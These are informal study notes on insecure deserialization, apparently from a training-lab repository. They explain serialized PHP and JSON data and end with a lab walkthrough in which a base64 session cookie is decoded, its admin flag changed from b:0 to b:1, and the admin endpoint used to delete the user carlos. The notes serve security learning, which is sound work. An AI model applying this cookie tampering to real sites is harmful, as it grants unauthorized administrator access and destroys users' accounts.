# Insecure deserialization


- <details>
     <summary>What is serialization?</summary>

     ## What is serialization?
     
     
     **Serialization** is the process of converting complex data structures, such as objects and their fields, into a "flatter" format that can be sent and received as a sequential stream of bytes. Serializing data makes it much simpler to:
     
     -   Write complex data to inter-process memory, a file, or a database
     -   Send complex data, for example, over a network, between different components of an application, or in an API call
     
     Crucially, when serializing an object, its state is also persisted. In other words, the object's attributes are preserved, along with their assigned values.
     



     
</details>




<details>
     <summary>Deserialization</summary>


![image](https://dock12.sorint.com/images/19-04-2023/deserialization-diagram.jpg)


## **`Serialized Data`**


From **`Object`** → **`String`**

> ### you will see in reqest 


## **`DeSerialized Data`**

From **`string`** → **`Object`**

> ### you don't see it it's in server



----


❗ Example showing the picture:
===================

🎯 Before Serialization (Object in the server):
-----------------------------------------


```js
array(
  "id" => 10,
  "admin" => true
)
```


🎯 After Serialization (string appears as Cookie):
------------------------------------------------

```java
a:2:{s:2:"id";i:10;s:5:"admin";b:1;}
```


🔥 Here **string → Serialized**\
🔥 Once the server receives it and returns it, Object → **Deserialized** (and you will not see it)



----

> ### Example on json

**`Object`**

```js
const user = { name: "frank", role: "user" };
```

**`String`**

```json
{"name":"frank","role":"user"}
```


This is **Serialized JSON string**\
It means just **Text** not Object.

In order to return Object, you must do:

```js
let obj = JSON. parse('{"name":"frank","role":"user"}');
```

And vice versa:

```js 
JSON.stringify({ name: "frank", role: "user" });
```



---

---



🎯 The real question:

===================

**How ​​do I know that the site is deserializing the data I see?**

======================================================================================

Answer yourself with 3 questions:

❓ 1) Does the data you see look serialized?

-----------------------------------------

If yes → there is a high probability that the site will deserialize.

❓ 2) Is the data listed in Cookie/Request and changed when I log in?

--------------------------------------------------------------

If Ah → This is Session Serialization.

❓ 3) If I changed the value... the site had different behavior?

------------------------------------------------------

like:

-   I remained admin

- An error occurred

- There was a crash

-   Logging out happened

If Ah → then it really does **deserialization**.










     
     
</details>


<details>
     <summary>Modifying data types</summary>






     
</details>

















































---

# **`Labs`**




<details>
  <summary>Lab: Modifying serialized objects</summary>

1. login as `wiener`
2. intercept the request of `/my-account`

<img width="707" height="621" alt="image" src="https://github.com/user-attachments/assets/4277d372-f554-4646-8b6e-ea389fb9d546" />

```
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d
```

3. send cookie to decoder found

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}%3d
```

4. now try to change **`b:0`** to **`b:1`** from false to true
 
<img width="1460" height="634" alt="image" src="https://github.com/user-attachments/assets/f1465f17-e624-4fa0-8456-fbb483a8a3c2" />

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}%3d
```

<img width="1102" height="428" alt="image" src="https://github.com/user-attachments/assets/b6e40c36-3938-4f69-89d6-0815ba9c3fd9" />

5. now visit admin panal and delete carlos

```
/admin/delete?username=carlos
```

<img width="1421" height="793" alt="image" src="https://github.com/user-attachments/assets/cef09826-e1ec-41af-af50-7804bb31a5a6" />


  
</details>
